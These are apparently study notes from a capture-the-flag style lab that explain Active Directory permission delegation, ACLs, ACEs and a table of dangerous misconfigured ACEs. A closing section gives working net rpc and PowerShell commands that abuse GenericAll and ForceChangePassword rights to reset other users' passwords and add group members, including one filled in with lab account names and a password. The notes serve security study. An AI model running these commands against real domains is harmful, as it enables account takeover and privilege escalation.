
### What is Permission Delegation in AD?

Active Directory allows administrators to **delegate specific permissions** or privileges to other users or groups so they can perform certain tasks without giving them full admin rights.

**Example:**

- Imagine a company with 50,000 employees.
- Only 3 people have Domain Admin (DA) credentials, which are very powerful.
- These 3 can't handle all password reset requests.
- So, the company delegates the ability to reset passwords to the Helpdesk team.
- The Helpdesk team can now reset passwords — but only because they have **delegated permission** to do that specific task, not full admin rights.

**ACL** = Full list of permissions on a user, group, or computer.

**ACE** = Each individual permission (like Reset Password, Add Member, etc.)

### Real Example (Shared Folder):

- **ACL** = somefolder.google.com
    - Alice: Edit
    - Bob: View
    - Charlie: No access
- **Each line** above = 1 **ACE**

### Examples of Dangerous Misconfigured ACEs

| ACE Type | What it allows | How it can be abused |
| --- | --- | --- |
| **ForceChangePassword** | Change a user's password without knowing old one | Reset passwords of privileged users (like Domain Admins) |
| **AddMembers** | Add users/computers to a group | Add attacker accounts to powerful groups |
| **GenericAll** | Full control over the object | Change passwords, add to groups, register services |
| **GenericWrite** | Change non-protected properties | Change logon scripts to run malicious code |
| **WriteOwner** | Change the owner of the object | Gain ownership and then full control |
| **WriteDACL** | Modify the ACLs themselves | Grant self full control over an object |
| **AllExtendedRights** | Perform extended actions like force password reset | Similar to ForceChangePassword but more broad |

### Exploit Commands for Common AD Permission Delegation ACEs

### 1. **`GenericAll` — Full Control**

If `UserA` has `GenericAll` over `UserB`, `UserA` can:

- Reset `UserB`'s password
- Add/remove `UserB` to/from groups
- Modify any attribute of `UserB`
- Impersonate `UserB`

**Example Exploit:**

```bash
# Reset password using net rpc password
net rpc password "TargetUser" "NewPassword123!" -U "Domain/UserA%UserAPassword" -S <DomainController>

# Example:
net rpc password "SHAWNA_BRAY" "NewPassword123@" -U "THM.CORP/TABATHA_BRITT%12345679" -S "haystack.thm.corp"
```

**Or PowerShell (if available):**

```powershell
Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
Add-ADGroupMember -Identity "TargetGroup" -Members "TargetUser"
# Other modifications via Set-ADUser or similar cmdlets
```

### 2. **`ForceChangePassword` — Password Reset**

`UserA` can reset `UserB`'s password without knowing old password.

**Exploit Command (same as above):**

```bash
net rpc password "TargetUser" "NewPassword123!" -U "Domain/UserA%UserAPassword" -S <DomainController>

# Example:
net rpc password "SHAWNA_BRAY" "NewPassword123@" -U "THM.CORP/TABATHA_BRITT%12345679" -S "haystack.thm.corp"
```

Or PowerShell:

```powershell

Set-ADAccountPassword -Identity "TargetUser" -Reset -NewPassword (ConvertTo-SecureString "NewPassword123!" -AsPlainText -Force)
```
